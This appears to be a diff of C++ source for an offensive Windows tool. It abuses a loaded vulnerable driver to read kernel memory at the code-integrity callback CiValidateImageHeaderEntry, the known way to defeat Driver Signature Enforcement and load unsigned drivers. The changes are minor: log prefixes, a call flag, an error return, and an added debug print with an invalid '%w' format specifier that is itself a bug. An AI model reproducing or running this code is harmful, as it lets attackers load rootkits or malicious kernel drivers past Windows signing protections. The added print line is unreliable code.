@@ -1,5 +1,6 @@
 #include "includes.h"
 #include "nt_structs.h"
+#include "ntdll.h"
 
 
 /*
@@ -25,7 +26,7 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE{ 10UL };
 	BOOLEAN SeLoadDriverWasEnabled{ 0 };
 
-	std::wprintf( L"[*] Load Driver called...\n" );
+	std::wprintf( L"[+] Load Driver called...\n" );
 
 	// Priv Check -> fix
 	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
@@ -35,6 +36,7 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
+	std::printf( "Path %w", DriverName );
 	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	stat = helpers::CreateDriverService( LoaderServiceName, LoaderPath );
@@ -45,7 +47,7 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 
 	std::wprintf( L"[+] Calling with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
 	wprintf( L"\n" );
-		vuln::drv_call( LoaderServiceName, DriverServiceName, 1 );
+		vuln::drv_call( LoaderServiceName, DriverServiceName, 0 );
 
 	return stat;
 }
@@ -75,12 +77,12 @@ NTSTATUS vuln::drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL 
 	HANDLE deviceHandle = { nullptr };
 
 	NTSTATUS stat = helpers::EnsureDeviceHandle( &deviceHandle, LoaderServiceName );
-	if ( !NT_SUCCESS( stat ) ) return stat;
+	if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };
 
 	auto ci = modules::get_CIValidate_ImageHeaderEntry();
 
-	wprintf( L"[!] ciValidateImageHeaderEntry: %p\n", ci.ciValidateImageHeaderEntry );
-	wprintf( L"[!] zwFlushInstructionCache   : %p\n", ci.zwFlushInstructionCache );
+	wprintf( L"[+] ciValidateImageHeaderEntry: %p\n", ci.ciValidateImageHeaderEntry );
+	wprintf( L"[+] zwFlushInstructionCache   : %p\n", ci.zwFlushInstructionCache );
 
 	DWORD64 originalCallback{};
 	stat = helpers::read_knrl_mem( deviceHandle, ci.ciValidateImageHeaderEntry, originalCallback );
@@ -107,3 +109,4 @@ cleanup:
 	helpers::DeleteService( DriverServiceName );
 	return stat;
 }
+
